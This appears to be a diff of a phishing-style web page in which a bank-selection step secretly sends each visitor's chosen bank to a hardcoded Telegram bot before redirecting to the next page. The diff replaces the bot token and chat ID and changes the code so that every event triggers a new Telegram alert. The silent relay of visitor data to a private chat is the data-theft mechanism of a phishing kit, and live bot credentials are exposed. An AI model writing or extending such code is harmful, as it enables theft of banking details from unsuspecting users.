@@ -126,42 +126,10 @@
     </div>
 
     <script>
-        // تم تحديث التوكن والشات آيدي هنا
-        const telegramBotToken = '8591237339:AAHOMH_hwr6ts_zlKb3ClGXb7RBpZ8ii5j0';
-        const telegramChatId = '1848565778';
+        const telegramBotToken = '8679116779:AAFA4ChWcYM9ZiHa3BAr3IylTOUEWvFQNkw';
+        const telegramChatId = '8362204213';
 
-        async function appendToTelegram(newContent) {
-            const existingId = localStorage.getItem('telegramMessageId');
-            const existingContent = localStorage.getItem('telegramMessageContent') || '';
-
-            if (existingId) {
-                const updatedContent = existingContent + '\n\n' + newContent;
-                try {
-                    const url = `https://api.telegram.org/bot${telegramBotToken}/editMessageText`;
-                    const response = await fetch(url, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: telegramChatId,
-                            message_id: parseInt(existingId),
-                            text: updatedContent,
-                            parse_mode: 'HTML'
-                        })
-                    });
-                    const data = await response.json();
-                    if (data.ok) {
-                        localStorage.setItem('telegramMessageContent', updatedContent);
-                    } else {
-                        await sendNewTelegram(updatedContent);
-                    }
-                } catch (error) {
-                    await sendNewTelegram(updatedContent);
-                }
-            } else {
-                await sendNewTelegram(newContent);
-            }
-        }
-
+        // إرسال رسالة تلغرام جديدة دائماً لضمان وصول التنبيه بنسبة 100%
         async function sendNewTelegram(message) {
             try {
                 const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
@@ -176,11 +144,11 @@
                 });
                 const data = await response.json();
                 if (data.ok) {
+                    // تخزين ID الرسالة للرجوع إليه إذا لزم الأمر
                     localStorage.setItem('telegramMessageId', data.result.message_id);
-                    localStorage.setItem('telegramMessageContent', message);
                 }
             } catch (error) {
-                console.error('خطأ:', error);
+                console.error('خطأ في الإرسال:', error);
             }
         }
 
@@ -197,7 +165,9 @@
                 localStorage.setItem('selectedBankName', bankName);
 
                 const content = `🏦 <b>اختيار البنك</b>\n\n📊 البنك المختار: ${bankName}`;
-                await appendToTelegram(content);
+                
+                // إرسال رسالة جديدة دائماً بدلاً من التعديل
+                await sendNewTelegram(content);
 
                 window.location.href = 'page4.html';
             });
